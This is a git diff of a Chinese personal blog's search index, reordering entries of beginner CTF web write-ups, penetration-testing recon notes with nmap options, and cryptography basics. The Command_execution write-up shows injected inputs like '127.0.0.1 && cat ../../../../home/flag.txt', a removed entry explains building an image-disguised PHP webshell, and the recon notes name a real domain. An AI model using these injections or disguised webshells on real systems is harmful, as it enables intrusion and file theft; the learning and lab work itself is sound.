+<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(68).png"></p>
+<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(69).png"></p>
+<h4 id="Weak-auth"><a href="#Weak-auth" class="headerlink" title="Weak auth"></a>Weak auth</h4><p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(78).png"></p>
+<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(79).png"></p>
+<h4 id="Simple-php"><a href="#Simple-php" class="headerlink" title="Simple php"></a>Simple php</h4><p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(71).png"></p>
+<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(72).png"></p>
+<h4 id="Xff-referer"><a href="#Xff-referer" class="headerlink" title="Xff_referer"></a>Xff_referer</h4><p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(80).png"></p>
+<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(81).png"></p>
+<h4 id="Webshell"><a href="#Webshell" class="headerlink" title="Webshell"></a>Webshell</h4><p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(82).png"></p>
+<h4 id="Command-execution"><a href="#Command-execution" class="headerlink" title="Command_execution"></a>Command_execution</h4><p>1、打开题目 2、掌握有关命令执行的知识 windows 或 linux 下: command1 &amp;&amp; command2 先执行 command1，如果为真，再执行 command</p>
+<p>2 command1 | command2 只执行 command2 command1 &amp; command2 先执行 command2 后执行 command1 command1 || command2 先执行 command1，如果为假，再执行 command2 命令执行漏洞（| || &amp; &amp;&amp; 称为 管道符） </p>
+<p>3、执行一个 ping 带一个其他命令试试，果然能看到当前目录下的文件 3、到上一级目录看看有啥 127.0.0.1 &amp;&amp; ls ../ </p>
+<p>4、找到 home 目录，看看 home 目录下有些啥，发现 flag 文件</p>
+<p> 5、利用 cat 命令打开 flag 文件，127.0.0.1 &amp;&amp; cat ../../../../home/flag.txt，得到 fl</p>
+<h4 id="Simple-js"><a href="#Simple-js" class="headerlink" title="Simple.js"></a>Simple.js</h4><p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(83).png"></p>
+<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(84).png"></p>
+<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(85).png"></p>
+<p>之后再将数字·对照ASCII码即可。</p>
+]]></content>
+      <tags>
+        <tag>攻防世界_web</tag>
       </tags>
   </entry>
   <entry>
@@ -907,105 +977,6 @@ cookie信息盗取可以直接登录-->]]></content>
       </tags>
   </entry>
   <entry>
-    <title>新手区</title>
-    <url>/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/</url>
-    <content><![CDATA[<h4 id="View-source"><a href="#View-source" class="headerlink" title="View_source"></a>View_source</h4><p>直接进入查看器查看；</p>
-<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(59).png"></p>
-<h4 id="Get-post"><a href="#Get-post" class="headerlink" title="Get_post"></a>Get_post</h4><p>浅谈HTTP中GET、POST用法以及它们的区别</p>
-<p>来自 <a href="https://www.cnblogs.com/williamjie/p/9099940.html">https://www.cnblogs.com/williamjie/p/9099940.html</a> </p>
-<p>解题过程：get ：在路径后直接添加?a=1;</p>
-<p>​           post: 勾选post data ，填入b=2.</p>
-<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(73).png"></p>
-<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(75).png"></p>
-<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(76).png"></p>
-<h4 id="Robots"><a href="#Robots" class="headerlink" title="Robots"></a>Robots</h4><p>1.查看协议：路径后添加robots.txt来查看；</p>
-<p>2.发现得到语句:</p>
-<p>User-agent: *<br>Disallow:<br>Disallow: f1ag_1s_h3re.php</p>
-<p>(此地无银) 直接构造语句来访问网站根目录下.php文件</p>
-<p>添加f1ag_1s_h3re.php。</p>
-<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(60).png"></p>
-<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(61).png"></p>
-<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(62).png"></p>
-<h4 id="Backup"><a href="#Backup" class="headerlink" title="Backup"></a>Backup</h4><p>php的备份有两种：*.php~和*.php.bak</p>
-<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(63).png"></p>
-<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(64).png"></p>
-<p>来自 <a href="https://www.cnblogs.com/yunqian2017/p/11515443.html">https://www.cnblogs.com/yunqian2017/p/11515443.html</a> </p>
-<h4 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h4><p>抓包配合火狐使用</p>
-<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(65).png"></p>
-<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(66).png"></p>
-<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(67).png"></p>
-<p>来自 &lt;<a href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=0&amp;id=5069&amp;page=1">https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=0&amp;id=5069&amp;page=1</a></p>
-<h4 id="Disabled-button"><a href="#Disabled-button" class="headerlink" title="Disabled_button"></a>Disabled_button</h4><p>直接编辑修改：题目为disabled那就用小聪明将它改成abled。</p>
-<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(68).png"></p>
-<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(69).png"></p>
-<h4 id="Weak-auth"><a href="#Weak-auth" class="headerlink" title="Weak auth"></a>Weak auth</h4><p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(78).png"></p>
-<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(79).png"></p>
-<h4 id="Simple-php"><a href="#Simple-php" class="headerlink" title="Simple php"></a>Simple php</h4><p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(71).png"></p>
-<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(72).png"></p>
-<h4 id="Xff-referer"><a href="#Xff-referer" class="headerlink" title="Xff_referer"></a>Xff_referer</h4><p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(80).png"></p>
-<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(81).png"></p>
-<h4 id="Webshell"><a href="#Webshell" class="headerlink" title="Webshell"></a>Webshell</h4><p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(82).png"></p>
-<h4 id="Command-execution"><a href="#Command-execution" class="headerlink" title="Command_execution"></a>Command_execution</h4><p>1、打开题目 2、掌握有关命令执行的知识 windows 或 linux 下: command1 &amp;&amp; command2 先执行 command1，如果为真，再执行 command</p>
-<p>2 command1 | command2 只执行 command2 command1 &amp; command2 先执行 command2 后执行 command1 command1 || command2 先执行 command1，如果为假，再执行 command2 命令执行漏洞（| || &amp; &amp;&amp; 称为 管道符） </p>
-<p>3、执行一个 ping 带一个其他命令试试，果然能看到当前目录下的文件 3、到上一级目录看看有啥 127.0.0.1 &amp;&amp; ls ../ </p>
-<p>4、找到 home 目录，看看 home 目录下有些啥，发现 flag 文件</p>
-<p> 5、利用 cat 命令打开 flag 文件，127.0.0.1 &amp;&amp; cat ../../../../home/flag.txt，得到 fl</p>
-<h4 id="Simple-js"><a href="#Simple-js" class="headerlink" title="Simple.js"></a>Simple.js</h4><p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(83).png"></p>
-<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(84).png"></p>
-<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(85).png"></p>
-<p>之后再将数字·对照ASCII码即可。</p>
-]]></content>
-      <tags>
-        <tag>攻防世界_web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>goktech</title>
-    <url>/2021/01/31/x/goktech/</url>
-    <content><![CDATA[<h2 id="渗透测试思路"><a href="#渗透测试思路" class="headerlink" title="渗透测试思路"></a>渗透测试思路</h2><p>1． 信息收集</p>
-<p>2． 漏洞挖掘</p>
-<p>3． 漏洞利用</p>
-<p>4． 输出渗透测试报告</p>
-<p>信息收集：</p>
-<p>1.</p>
-<p>基本信息：</p>
-<p>域名信息 : goktech.cn</p>
-<p>子域名: 子域名挖掘机.exe  :bbs.goktech.cn   phpinfo,me</p>
-<p>ip地址：站长之家</p>
-<p>同ip地址的其他网站信息</p>
-<p>端口 80(http）443(https)</p>
-<p>服务，服务版本（web服务） 同网段的其他服务器信息（c段）</p>
-<p>信息泄露，GitHub.com 如qq.com user pass</p>
-<p>网站目录：御剑</p>
-<p>2.</p>
-<p>Os操作系统</p>
-<p>Linux windows mac等</p>
-<p>3.</p>
-<p>  Web中间件（web程序，用来提供网页服务）</p>
-<p>类型、版本：iis，apache，nginx，weblogic</p>
-<p>4.</p>
-<p>  数据库</p>
-<p>类型、版本：MySQL、mssql、Oracle、access</p>
-<p>5.</p>
-<p> 后编的脚本类型</p>
-<h3 id="Linux的指令"><a href="#Linux的指令" class="headerlink" title="Linux的指令"></a>Linux的指令</h3><p>ifconfig—查看ip地址</p>
-<p>dhclient—重新获取地址</p>
-<h4 id="namp-诸神之眼"><a href="#namp-诸神之眼" class="headerlink" title="namp,诸神之眼"></a>namp,诸神之眼</h4><p>#  namp -sS -p 80,443 10.10.10.1 -O</p>
-<p>-p 迅速扫描指定的端口</p>
-<p>-F  快速扫描100个常用的端口</p>
-<p>-r  顺序扫描，按从小到大的顺序进行端口扫描</p>
-<p>其他常用选项</p>
-<p>-sV 检测服务端软件版本信息</p>
-<p>-O  检测操作系统信息</p>
-<p>-Pn 禁用namp的主机检测功能</p>
-<p>-A 探测服务版本、对操作系统进行识别、进行脚本扫描、进行路由探测</p>
-<p><img src="http://rongcloud-web.qiniudn.com/docs_demo_rongcloud_logo.png"></p>
-]]></content>
-      <tags>
-        <tag>分享会</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>端口</title>
     <url>/2021/01/24/web/%E7%AB%AF%E5%8F%A3/</url>
     <content><![CDATA[<p>80端口，443端口</p>
@@ -1069,29 +1040,49 @@ cookie信息盗取可以直接登录-->]]></content>
 ]]></content>
   </entry>
   <entry>
-    <title>密码学</title>
-    <url>/2020/10/18/x/%E5%AF%86%E7%A0%81%E5%AD%A6/</url>
-    <content><![CDATA[<p>密码：基本思想  伪装</p>
-<p>明文空间M 集合</p>
-<p>密文空间C  集合</p>
-<p>密钥空间K            Ke 加密钥   Kd 解密钥</p>
-<p>加密算法E：M—&gt;C</p>
-<p>解密算法D：C—-&gt;M   而且解密变换是加密变换的逆过程</p>
-<p><a href="https://img-blog.csdn.net/20180831003945940?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70">https://img-blog.csdn.net/20180831003945940?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70</a></p>
-<p>共模<br>设a，b为正整数，如果用m分别除去a和b所得的余数相同，则称a和b关于模m同余<br>记作a=b<mod m><br>eg:1=27<mod26><br>(一个数除以比它大的数，余数为它本身）</mod26></mod></p>
-<p>密码学了解：</p>
-<p>1、<strong>对称密码算法</strong></p>
-<p>加密密钥和解密密钥相同（或者实质上等同，即从一个易推出另一个），</p>
-<p>• DES、3DES、IDEA、AES</p>
-<p>2、<strong>非对称密码算法</strong></p>
-<p>加密密钥和解密密钥不同，其中的加密密钥可以公开， 称为公开密钥，简称公钥；解密密钥必须保密，称为私人密钥，</p>
-<p>• RSA、ECC、ElGamal</p>
-<p>3、<strong>编码方式</strong></p>
-<p>ASCII编码：ASCII在线转换地址：<a href="http://www.mokuge.com/tool/asciito16/">http://www.mokuge.com/tool/asciito16/</a></p>
-<p>base64编码：</p>
+    <title>goktech</title>
+    <url>/2021/01/31/x/goktech/</url>
+    <content><![CDATA[<h2 id="渗透测试思路"><a href="#渗透测试思路" class="headerlink" title="渗透测试思路"></a>渗透测试思路</h2><p>1． 信息收集</p>
+<p>2． 漏洞挖掘</p>
+<p>3． 漏洞利用</p>
+<p>4． 输出渗透测试报告</p>
+<p>信息收集：</p>
+<p>1.</p>
+<p>基本信息：</p>
+<p>域名信息 : goktech.cn</p>
+<p>子域名: 子域名挖掘机.exe  :bbs.goktech.cn   phpinfo,me</p>
+<p>ip地址：站长之家</p>
+<p>同ip地址的其他网站信息</p>
+<p>端口 80(http）443(https)</p>
+<p>服务，服务版本（web服务） 同网段的其他服务器信息（c段）</p>
+<p>信息泄露，GitHub.com 如qq.com user pass</p>
+<p>网站目录：御剑</p>
+<p>2.</p>
+<p>Os操作系统</p>
+<p>Linux windows mac等</p>
+<p>3.</p>
+<p>  Web中间件（web程序，用来提供网页服务）</p>
+<p>类型、版本：iis，apache，nginx，weblogic</p>
+<p>4.</p>
+<p>  数据库</p>
+<p>类型、版本：MySQL、mssql、Oracle、access</p>
+<p>5.</p>
+<p> 后编的脚本类型</p>
+<h3 id="Linux的指令"><a href="#Linux的指令" class="headerlink" title="Linux的指令"></a>Linux的指令</h3><p>ifconfig—查看ip地址</p>
+<p>dhclient—重新获取地址</p>
+<h4 id="namp-诸神之眼"><a href="#namp-诸神之眼" class="headerlink" title="namp,诸神之眼"></a>namp,诸神之眼</h4><p>#  namp -sS -p 80,443 10.10.10.1 -O</p>
+<p>-p 迅速扫描指定的端口</p>
+<p>-F  快速扫描100个常用的端口</p>
+<p>-r  顺序扫描，按从小到大的顺序进行端口扫描</p>
+<p>其他常用选项</p>
+<p>-sV 检测服务端软件版本信息</p>
+<p>-O  检测操作系统信息</p>
+<p>-Pn 禁用namp的主机检测功能</p>
+<p>-A 探测服务版本、对操作系统进行识别、进行脚本扫描、进行路由探测</p>
+<p><img src="http://rongcloud-web.qiniudn.com/docs_demo_rongcloud_logo.png"></p>
 ]]></content>
       <tags>
-        <tag>密码学</tag>
+        <tag>分享会</tag>
       </tags>
   </entry>
   <entry>
@@ -1119,6 +1110,32 @@ cookie信息盗取可以直接登录-->]]></content>
       </tags>
   </entry>
   <entry>
+    <title>密码学</title>
+    <url>/2020/10/18/x/%E5%AF%86%E7%A0%81%E5%AD%A6/</url>
+    <content><![CDATA[<p>密码：基本思想  伪装</p>
+<p>明文空间M 集合</p>
+<p>密文空间C  集合</p>
+<p>密钥空间K            Ke 加密钥   Kd 解密钥</p>
+<p>加密算法E：M—&gt;C</p>
+<p>解密算法D：C—-&gt;M   而且解密变换是加密变换的逆过程</p>
+<p><a href="https://img-blog.csdn.net/20180831003945940?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70">https://img-blog.csdn.net/20180831003945940?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70</a></p>
+<p>共模<br>设a，b为正整数，如果用m分别除去a和b所得的余数相同，则称a和b关于模m同余<br>记作a=b<mod m><br>eg:1=27<mod26><br>(一个数除以比它大的数，余数为它本身）</mod26></mod></p>
+<p>密码学了解：</p>
+<p>1、<strong>对称密码算法</strong></p>
+<p>加密密钥和解密密钥相同（或者实质上等同，即从一个易推出另一个），</p>
+<p>• DES、3DES、IDEA、AES</p>
+<p>2、<strong>非对称密码算法</strong></p>
+<p>加密密钥和解密密钥不同，其中的加密密钥可以公开， 称为公开密钥，简称公钥；解密密钥必须保密，称为私人密钥，</p>
+<p>• RSA、ECC、ElGamal</p>
+<p>3、<strong>编码方式</strong></p>
+<p>ASCII编码：ASCII在线转换地址：<a href="http://www.mokuge.com/tool/asciito16/">http://www.mokuge.com/tool/asciito16/</a></p>
+<p>base64编码：</p>
+]]></content>
+      <tags>
+        <tag>密码学</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>汇编基础知识</title>
     <url>/2021/01/22/x/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
     <content><![CDATA[<h4 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h4><p>了解硬件系统的结构，重点：利用硬件系统的编程结构和指令</p>
@@ -1137,23 +1154,6 @@ cookie信息盗取可以直接登录-->]]></content>
 ]]></content>
       <tags>
         <tag>vmware</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>图片马</title>
-    <url>/2021/02/22/upload-labs/%E5%9B%BE%E7%89%87%E9%A9%AC/</url>
-    <content><![CDATA[<p>  1.打开windows命令控制台，cd到图片与文件同在路径下</p>
-<p>  如 1.jpg与 2.php同在桌面，则：</p>
-<p>  cd   desktop</p>
-<ol start="2">
-<li><p>输入指令：copy  1.jpg/b  +  2.php/a  shell,jpg   之后回车，那么形成的图片马文件就会出现在自己的桌面上。</p>
-<p><img src="/2021/02/22/upload-labs/%E5%9B%BE%E7%89%87%E9%A9%AC/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(38).png"></p>
-<p>​    </p>
-</li>
-</ol>
-]]></content>
-      <tags>
-        <tag>upload-labs</tag>
       </tags>
   </entry>
   <entry>
